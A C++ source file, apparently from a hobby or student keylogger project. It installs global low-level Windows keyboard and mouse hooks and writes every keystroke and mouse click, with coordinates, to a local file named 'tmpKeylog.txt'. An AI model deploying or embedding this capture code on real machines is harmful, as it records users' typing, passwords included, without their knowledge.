#include "HandleHook.h"

HHOOK hHock = NULL;
HHOOK mHock = NULL;
HINSTANCE	modulehandle;

HandleHook::HandleHook()
{
}

HandleHook::~HandleHook()
{
	UnhookWindowsHookEx(mHock);
	UnhookWindowsHookEx(hHock);
}

LRESULT CALLBACK HandleHook::MyKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	HookerKey	test;
	FileLog		file;

	if (nCode == HC_ACTION)
	{
		file.initialize("tmpKeylog.txt");
		DWORD _vkCode = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam)->vkCode;
		Input input;
		switch (wParam)
		{
			case WM_KEYUP:
				//std::cout << "Je relache " << std::endl;
				input = test.OrderInput(_vkCode);
				input.setEvent("released");
				file.addInput(input);
			case WM_KEYDOWN:
				//std::cout << "J'appuie" << std::endl;
				input = test.OrderInput(_vkCode);
				input.setEvent("pressed");
				file.addInput(input);
		}

	}
	return(CallNextHookEx(hHock, nCode, wParam, lParam));
}

LRESULT CALLBACK HandleHook::MyMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	HookerMouse	test;
	FileLog		file;

	if (nCode == HC_ACTION)
	{
		POINT _vkCode = reinterpret_cast<MSLLHOOKSTRUCT*>(lParam)->pt;
		file.initialize("tmpKeyLog.txt");
		Input input;
		input = test.OrderInput(2);
		input.setPosX(_vkCode.x);
		input.setPosY(_vkCode.y);
		switch (wParam)
		{
			case WM_LBUTTONDOWN:
				input = test.OrderInput(0);
				input.setPosX(_vkCode.x);
				input.setPosY(_vkCode.y);
				input.setAmount(0);
				file.addInput(input);
				break;

			case WM_RBUTTONDOWN:
				input = test.OrderInput(1);
				input.setPosX(_vkCode.x);
				input.setPosY(_vkCode.y);
				input.setAmount(0);
				file.addInput(input);
				break;
		}
		file.addInput(input);
	}
	return(CallNextHookEx(mHock, nCode, wParam, lParam));
}

bool HandleHook::initialize(double timeout)
{
	_t = timeout;
	
	modulehandle = GetModuleHandle(NULL);
	hHock = SetWindowsHookEx(WH_KEYBOARD_LL, MyKeyboardProc, modulehandle, NULL);
	mHock = SetWindowsHookEx(WH_MOUSE_LL, MyMouseProc, modulehandle, NULL);
	return true;
}

bool HandleHook::getMessage()
{
	MsgWaitForMultipleObjectsEx(0, NULL, (DWORD)((int)_t * 1000), QS_ALLINPUT ,0);
	return (!PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
}

bool HandleHook::transAndDispatch()
{
	TranslateMessage(&msg);
	DispatchMessage(&msg);
	return true;
}